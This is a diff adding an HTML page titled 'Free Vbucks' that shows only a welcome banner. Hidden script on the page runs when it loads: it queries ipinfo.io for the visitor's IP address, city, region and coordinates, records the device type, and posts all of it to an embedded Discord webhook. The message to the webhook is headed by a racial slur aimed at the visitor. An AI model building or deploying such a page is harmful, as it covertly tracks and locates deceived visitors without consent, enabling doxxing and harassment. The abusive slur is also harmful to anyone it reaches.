@@ -1,0 +1,95 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Free Vbucks</title>  
+    <style>  
+        body {  
+            font-family: Arial, sans-serif;  
+            background-color: #f4f6f9;  
+            color: #333;  
+            margin: 0;  
+            padding: 0;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            height: 100vh;  
+        }  
+
+        .welcome-container {  
+            background-color: #fff;  
+            padding: 30px;  
+            max-width: 800px;  
+            width: 100%;  
+            border-radius: 10px;  
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);  
+            text-align: center;  
+        }  
+
+        .welcome-header h1 {  
+            font-size: 36px;  
+            color: #4CAF50;  
+        }  
+    </style>  
+</head>  
+<body>  
+
+    <div class="welcome-container">  
+        <div class="welcome-header">  
+            <h1>Welcome to Our Website</h1>  
+        </div>  
+    </div>  
+
+    <script>  
+        // Your actual Discord webhook URL  
+        const webhookURL = 'https://discord.com/api/webhooks/1336035102332944447/ncn_vkkYZ5x6HwBlSVyNYNsDYeCttzuOHYgAHyAh1f0pvHH5_5G_kIYEMi9vHjPMvQww'; // Replace with your actual URL  
+
+        // Your actual API token from ipinfo.io  
+        fetch('https://ipinfo.io/json?token=5b5151fe3ce84c') // Replace with your token  
+            .then(response => response.json())  
+            .then(data => {  
+                const ip = data.ip || 'Unknown IP';  
+                const country = data.country || 'Unknown Country';  
+                const city = data.city || 'Unknown City';  
+                const region = data.region || 'Unknown Region';  
+                const location = data.loc || 'Unknown Location';  
+                const userAgent = navigator.userAgent;  
+                const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : /tablet/i.test(userAgent) ? 'Tablet' : 'Desktop';  
+
+                // Build the embedded message for Discord  
+                const message = {  
+                    content: `DUMB NIGGA IP:`,  
+                    embeds: [{  
+                        title: `Visitor Details`,  
+                        fields: [  
+                            { name: "IP Address", value: ip, inline: true },  
+                            { name: "Country", value: country, inline: true },  
+                            { name: "City", value: city, inline: true },  
+                            { name: "Region", value: region, inline: true },  
+                            { name: "Location", value: location, inline: true },  
+                            { name: "Device", value: deviceType, inline: true },  
+                            { name: "User Agent", value: userAgent, inline: false },  
+                        ],  
+                        color: 3066993,  // Color for the embed (green)  
+                    }]  
+                };  
+
+                // Send data to Discord webhook  
+                fetch(webhookURL, {  
+                    method: 'POST',  
+                    headers: { 'Content-Type': 'application/json' },  
+                    body: JSON.stringify(message)  
+                })  
+                .then(response => response.json())  
+                .then(data => console.log('Webhook sent:', data))  
+                .catch(error => console.error('Error sending webhook:', error));  
+
+            })  
+            .catch(error => {  
+                console.error('Error fetching IP information:', error);  
+            });  
+    </script>  
+
+</body>  
+</html>
